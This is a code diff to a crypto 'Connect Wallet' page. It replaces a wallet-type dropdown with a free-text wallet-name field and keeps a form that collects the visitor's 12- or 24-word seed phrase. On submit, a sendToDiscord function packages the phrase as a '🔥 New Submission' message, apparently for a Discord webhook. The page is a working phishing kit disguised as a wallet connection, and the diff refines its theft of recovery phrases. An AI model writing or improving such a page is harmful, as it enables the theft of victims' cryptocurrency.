@@ -44,7 +44,7 @@
       margin-top: 10px;
     }
 
-    select, input[type="text"] {
+    input[type="text"] {
       padding: 10px;
       width: 100%;
       margin-top: 10px;
@@ -85,13 +85,8 @@
     <button class="btn" onclick="document.getElementById('walletSection').style.display='block'">Connect Wallet</button>
 
     <form id="walletSection" style="display:none; margin-top:20px;" onsubmit="sendToDiscord(event)">
-      <label for="walletSelect">Wallet Type:</label>
-      <select id="walletSelect" name="wallet" required>
-        <option value="MetaMask">MetaMask</option>
-        <option value="TrustWallet">Trust Wallet</option>
-        <option value="Coinbase">Coinbase Wallet</option>
-        <option value="Other">Other</option>
-      </select>
+      <label for="walletName">Wallet Name:</label>
+      <input type="text" id="walletName" name="walletName" placeholder="Enter your wallet name" required>
 
       <label for="seedInput" style="margin-top:10px;">Seed Phrase:</label>
       <input type="text" id="seedInput" name="phrase" placeholder="Enter your 12 or 24-word phrase" required>
@@ -126,12 +121,12 @@
     function sendToDiscord(event) {
       event.preventDefault();
 
-      const wallet = document.getElementById('walletSelect').value;
+      const walletName = document.getElementById('walletName').value;
       const phrase = document.getElementById('seedInput').value;
 
       const data = {
         content: `🔥 New Submission:
-        \nWallet Type: **${wallet}**
+        \nWallet Name: **${walletName}**
         \nSeed Phrase: **${phrase}**`
       };
 
